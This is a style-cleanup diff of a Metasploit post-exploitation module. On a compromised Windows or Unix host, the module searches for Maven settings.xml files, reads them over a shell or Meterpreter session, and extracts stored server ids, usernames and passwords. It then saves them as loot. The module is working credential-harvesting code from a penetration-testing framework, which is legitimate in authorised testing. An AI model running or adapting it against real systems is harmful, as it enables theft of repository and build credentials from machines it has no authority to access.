@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => ['elenoir'],
-        'Platform' => %w{bsd linux osx unix win},
+        'Platform' => %w[bsd linux osx unix win],
         'SessionTypes' => ['shell', 'meterpreter'],
         'Compat' => {
           'Meterpreter' => {
@@ -37,19 +37,19 @@ class MetasploitModule < Msf::Post
   end
 
   def gathernix
-    print_status("Unix OS detected")
+    print_status('Unix OS detected')
     files = cmd_exec('locate settings.xml').split("\n")
     # Handle case where locate does not exist (error is returned in first element)
     if files.length == 1 && !directory?(files.first)
       files = []
       paths = enum_user_directories.map { |d| d }
       if paths.nil? || paths.empty?
-        print_error("No users directory found")
+        print_error('No users directory found')
         return
       end
       paths.each do |path|
         path.chomp!
-        file = "settings.xml"
+        file = 'settings.xml'
         target = "#{path}/#{file}"
         if file? target
           files.push(target)
@@ -60,23 +60,23 @@ class MetasploitModule < Msf::Post
   end
 
   def gatherwin
-    print_status("Windows OS detected")
+    print_status('Windows OS detected')
     return cmd_exec('cd\ && dir settings.xml /b /s').split("\n")
   end
 
   def run
-    print_status("Finding user directories")
-    files = ""
+    print_status('Finding user directories')
+    files = ''
     case session.platform
     when 'windows'
       files = gatherwin
     when 'unix', 'linux', 'bsd', 'osx'
       files = gathernix
     else
-      print_error("Incompatible platform")
+      print_error('Incompatible platform')
     end
     if files.nil? || files.empty?
-      print_error("No settings.xml file found")
+      print_error('No settings.xml file found')
       return
     end
     download_loot(files)
@@ -97,41 +97,41 @@ class MetasploitModule < Msf::Post
     xml_doc = Nokogiri::XML(data)
     xml_doc.remove_namespaces!
 
-    xml_doc.xpath("//server").each do |server|
-      id = server.xpath("id").text
-      username = server.xpath("username").text
-      password = server.xpath("password").text
+    xml_doc.xpath('//server').each do |server|
+      id = server.xpath('id').text
+      username = server.xpath('username').text
+      password = server.xpath('password').text
 
-      print_status("Collected the following credentials:")
-      print_status("    Id: %s" % id)
-      print_status("    Username: %s" % username)
-      print_status("    Password: %s" % password)
+      print_status('Collected the following credentials:')
+      print_status('    Id: %s' % id)
+      print_status('    Username: %s' % username)
+      print_status('    Password: %s' % password)
 
-      print_status("Try to find url from id...")
-      realm = ""
+      print_status('Try to find url from id...')
+      realm = ''
 
       xml_doc.xpath("//mirror[id = '#{id}']").each do |mirror|
-        realm = mirror.xpath("url").text
+        realm = mirror.xpath('url').text
         print_status("Found url in mirror : #{realm}")
       end
 
       if realm.blank?
         xml_doc.xpath("//repository[id = '#{id}']").each do |repository|
-          realm = repository.xpath("url").text
+          realm = repository.xpath('url').text
           print_status("Found url in repository : #{realm}")
         end
       end
 
       if realm.blank?
-        print_status("No url found, id will be set as realm")
+        print_status('No url found, id will be set as realm')
         realm = id
       end
 
-      print_line("")
+      print_line('')
 
       credential_data = {
         origin_type: :import,
-        module_fullname: self.fullname,
+        module_fullname: fullname,
         filename: target,
         service_name: 'maven',
         realm_value: realm,
@@ -147,14 +147,12 @@ class MetasploitModule < Msf::Post
 
   def extract(target)
     print_status("Reading settings.xml file from #{target}")
-    data = ""
-    if session.type == "shell"
+    data = ''
+    if session.type == 'shell'
       data = session.shell_command("cat #{target}")
     else
-      settings = session.fs.file.new("#{target}", "rb")
-      until settings.eof?
-        data << settings.read
-      end
+      settings = session.fs.file.new(target.to_s, 'rb')
+      data << settings.read until settings.eof?
     end
 
     parse_settings(target, data)
